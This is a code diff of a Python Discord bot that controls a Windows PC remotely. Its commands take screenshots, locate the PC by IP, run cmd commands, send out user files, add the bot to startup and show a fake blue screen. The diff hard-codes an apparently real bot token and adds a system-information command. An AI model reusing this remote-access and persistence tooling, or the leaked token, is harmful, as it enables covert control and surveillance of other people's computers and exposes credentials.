@@ -41,9 +41,9 @@ def run_as_admin():
 # CONFIG
 # ============================================================
 
-BOT_TOKEN = "PUT TOKAN HERE"
+BOT_TOKEN = "MTUzNjQ0MDEwNjU4NjYwMzU1MA.G4YlXc.aj3FIgRqEAstlca44gfkphRVg4VlH4CMscKLAM"
 
-GUILD_ID = PUT CHANEL ID HERE
+GUILD_ID = 1536111555018629212
 
 
 # ============================================================
@@ -62,7 +62,7 @@ tree = app_commands.CommandTree(client)
 
 @tree.command(
     name="location",
-    description="Shows IP and approximate location"
+    description="Show this PC's public IP and approximate location"
 )
 async def location(interaction: discord.Interaction):
 
@@ -98,7 +98,7 @@ async def location(interaction: discord.Interaction):
         )
 
         embed = discord.Embed(
-            title=" PC Location",
+            title="📍 PC Location",
             description=f"**IP:** `{ip}`",
             color=discord.Color.blue()
         )
@@ -141,7 +141,7 @@ async def location(interaction: discord.Interaction):
 
 @tree.command(
     name="screenshot",
-    description="Take a screenshot"
+    description="Take a screenshot of the primary monitor"
 )
 async def screenshot(interaction: discord.Interaction):
 
@@ -211,7 +211,7 @@ async def screenshot(interaction: discord.Interaction):
 
 @tree.command(
     name="wallpaper",
-    description="Set wallpaper"
+    description="Set the wallpaper"
 )
 async def wallpaper(
     interaction: discord.Interaction,
@@ -530,7 +530,7 @@ def show_fake_bsod():
 
 @tree.command(
     name="blue",
-    description="Show a fake blue screen"
+    description="Show a fake Windows blue screen"
 )
 async def blue(
     interaction: discord.Interaction
@@ -549,7 +549,7 @@ async def blue(
 # ============================================================
 
 RUNNABLE_FILES = {
-    # windows
+    # Windows
     "notepad": r"C:\Windows\System32\notepad.exe",
     "calculator": r"C:\Windows\System32\calc.exe",
     "paint": r"C:\Users\brodie\AppData\Local\Microsoft\WindowsApps\mspaint.exe",
@@ -563,13 +563,13 @@ RUNNABLE_FILES = {
     "spotify": r"C:\Users\brodie\AppData\Local\Microsoft\WindowsApps\Spotify.exe",
     "vscode": r"C:\Users\brodie\AppData\Local\Programs\Microsoft VS Code\Code.exe",
 
-    # browsers
+    # Browsers
     "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
     "firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
     "brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
 
-    # norm apps
+    # Common apps
     "steam": r"C:\Program Files (x86)\Steam\steam.exe",
     "spotify": r"C:\Users\YOURNAME\AppData\Roaming\Spotify\Spotify.exe",
     "discord": r"C:\Users\YOURNAME\AppData\Local\Discord\Update.exe",
@@ -642,7 +642,7 @@ async def run(
 
 @tree.command(
     name="cmd",
-    description="Run a command in cmd"
+    description="Run a command in Windows cmd.exe"
 )
 @app_commands.describe(
     command="Command text to execute"
@@ -734,7 +734,7 @@ async def cmd(
 
 @tree.command(
     name="showimage",
-    description="show a image on the PC"
+    description="Display an uploaded image on the PC"
 )
 async def showimage(
     interaction: discord.Interaction,
@@ -953,7 +953,7 @@ async def file(
 
 @tree.command(
     name="export",
-    description="save a file from Desktop, Downloads, or Documents"
+    description="Send a file from Desktop, Downloads, or Documents"
 )
 @app_commands.describe(
     folder="Choose the folder where the file is located",
@@ -1213,6 +1213,91 @@ async def startup(interaction: discord.Interaction):
 
 
 # ============================================================
+# /system
+
+@tree.command(
+    name="system",
+    description="Show this PC's system information"
+)
+async def system(interaction: discord.Interaction):
+    await interaction.response.defer()
+
+    try:
+        import platform
+        import shutil
+        import time
+
+        def collect_system_info():
+            # Keep psutil optional so the rest of the bot still works if it
+            # isn't installed. CPU/RAM values fall back to "Unavailable".
+            try:
+                import psutil
+            except ImportError:
+                psutil = None
+
+            hostname = platform.node() or "Unknown"
+            os_name = f"{platform.system()} {platform.release()}"
+            try:
+                windows_version = platform.win32_ver()[0]
+                if windows_version:
+                    os_name += f" (Build {windows_version})"
+            except Exception:
+                pass
+
+            cpu = platform.processor() or platform.machine() or "Unknown"
+            python_version = platform.python_version()
+
+            if psutil:
+                ram_total = psutil.virtual_memory().total
+                ram_used = psutil.virtual_memory().used
+                ram = f"{ram_used / (1024**3):.1f} / {ram_total / (1024**3):.1f} GB"
+                cpu_usage = f"{psutil.cpu_percent(interval=0.5):.1f}%"
+                uptime_seconds = max(0, time.time() - psutil.boot_time())
+                uptime = str(__import__('datetime').timedelta(seconds=int(uptime_seconds)))
+            else:
+                ram = "Unavailable (install psutil)"
+                cpu_usage = "Unavailable"
+                uptime = "Unavailable"
+
+            disk = shutil.disk_usage(os.path.abspath(os.sep))
+            disk_used = f"{disk.used / (1024**3):.1f} GB"
+            disk_total = f"{disk.total / (1024**3):.1f} GB"
+            disk_text = f"{disk_used} / {disk_total}"
+
+            return hostname, os_name, cpu, cpu_usage, ram, disk_text, uptime, python_version
+
+        (
+            hostname,
+            os_name,
+            cpu,
+            cpu_usage,
+            ram,
+            disk,
+            uptime,
+            python_version,
+        ) = await asyncio.to_thread(collect_system_info)
+
+        embed = discord.Embed(
+            title="🖥️ System Information",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="PC", value=f"`{hostname}`", inline=False)
+        embed.add_field(name="OS", value=os_name, inline=True)
+        embed.add_field(name="CPU", value=cpu, inline=True)
+        embed.add_field(name="CPU Usage", value=cpu_usage, inline=True)
+        embed.add_field(name="RAM", value=ram, inline=True)
+        embed.add_field(name="Disk", value=disk, inline=True)
+        embed.add_field(name="Uptime", value=uptime, inline=True)
+        embed.add_field(name="Python", value=python_version, inline=True)
+
+        await interaction.followup.send(embed=embed)
+
+    except Exception as e:
+        await interaction.followup.send(
+            f"❌ Couldn't get system information: `{e}`"
+        )
+
+# ============================================================
 # /status
 # ============================================================
 
@@ -1319,7 +1404,7 @@ async def on_ready():
 async def help_command(interaction: discord.Interaction):
 
     embed = discord.Embed(
-        title="Bot Commands",
+        title="🤖 Bot Commands",
         description="Here are the available commands:",
         color=discord.Color.blue()
     )
@@ -1399,6 +1484,12 @@ async def help_command(interaction: discord.Interaction):
     embed.add_field(
         name="/startup",
         value="Add this app to Windows startup.",
+        inline=False
+    )
+
+    embed.add_field(
+        name="/system",
+        value="Show the PC's system information.",
         inline=False
     )
 
